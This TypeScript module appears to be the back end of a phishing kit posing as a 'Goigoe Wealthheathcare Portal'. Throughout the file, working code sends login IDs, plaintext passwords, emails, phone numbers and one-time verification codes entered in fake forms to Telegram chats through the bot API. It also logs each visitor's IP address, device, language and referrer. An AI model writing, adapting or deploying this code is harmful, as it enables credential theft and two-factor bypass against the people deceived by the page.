const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const CHAT_IDS = process.env.TELEGRAM_CHAT_IDS?.split(',').map(id => id.trim()).filter(Boolean) || []

interface VisitorData {
  location?: string
  ip?: string
  timezone?: string
  isp?: string
  device?: string
  screen?: string
  language?: string
  referrer?: string
  utcTime?: string
  page?: string
}

interface FormData {
  type: 'login' | 'registration' | 'email_verification' | 'text_verification' | 'email_selection' | 'text_selection'
  userId?: string
  password?: string
  email?: string
  phone?: string
  otp?: string
  timestamp: string
  page: string
}

export async function sendVisitorNotification(data: VisitorData) {
  const message = `🌐 New Visitor - Goigoe Wealthheathcare Portal

📍 Location: ${data.location || 'Unknown'}

🌍 IP: ${data.ip || 'Unknown'}

⏰ Timezone: ${data.timezone || 'Unknown'}

🌐 ISP: ${data.isp || 'Unknown'}

📱 Device: ${data.device || 'Unknown'}

🖥️ Screen: ${data.screen || 'Unknown'}

🌍 Language: ${data.language || 'Unknown'}

🔗 Referrer: ${data.referrer || 'Direct'}

🕒 UTC Time: ${data.utcTime || new Date().toISOString()}

📄 Page: ${data.page || 'Unknown'}`

  return sendTelegramMessage(message)
}

export async function sendFormNotification(data: FormData) {
  const typeLabels: Record<string, string> = {
    'login': 'LOGIN',
    'registration': 'REGISTRATION',
    'email_verification': 'EMAIL VERIFICATION',
    'text_verification': 'TEXT VERIFICATION',
    'email_selection': 'EMAIL OPTION SELECTED',
    'text_selection': 'TEXT OPTION SELECTED'
  }
  
  const message = `📝 Form Submission

🔹 Type: ${typeLabels[data.type] || data.type.toUpperCase()}
📄 Page: ${data.page}
🕒 Time: ${data.timestamp}

${data.userId ? `👤 User ID: ${data.userId}` : ''}
${data.password ? `🔒 Password: ${data.password}` : ''}
${data.email ? `📧 Email: ${data.email}` : ''}
${data.phone ? `📱 Phone: ${data.phone}` : ''}
${data.otp ? `🔐 OTP Code: ${data.otp}` : ''}`

  return sendTelegramMessage(message)
}

async function sendTelegramMessage(message: string) {
  if (!TELEGRAM_BOT_TOKEN) {
    console.error('TELEGRAM_BOT_TOKEN is not configured')
    return []
  }

  if (CHAT_IDS.length === 0) {
    console.error('TELEGRAM_CHAT_IDS is not configured')
    return []
  }

  const promises = CHAT_IDS.map(chatId => 
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML'
      })
    }).catch(error => {
      console.error(`Failed to send to chat ${chatId}:`, error)
      return null
    })
  )

  const results = await Promise.allSettled(promises)
  return results
}

export async function getVisitorData(request: Request): Promise<VisitorData> {
  const headers = request.headers
  const forwarded = headers.get('x-forwarded-for')
  const realIp = headers.get('x-real-ip')
  const ip = forwarded?.split(',')[0] || realIp || 'Unknown'

  return {
    ip,
    device: headers.get('user-agent') || 'Unknown',
    language: headers.get('accept-language')?.split(',')[0] || 'Unknown',
    referrer: headers.get('referer') || 'Direct',
    utcTime: new Date().toISOString(),
    page: new URL(request.url).pathname
  }
}
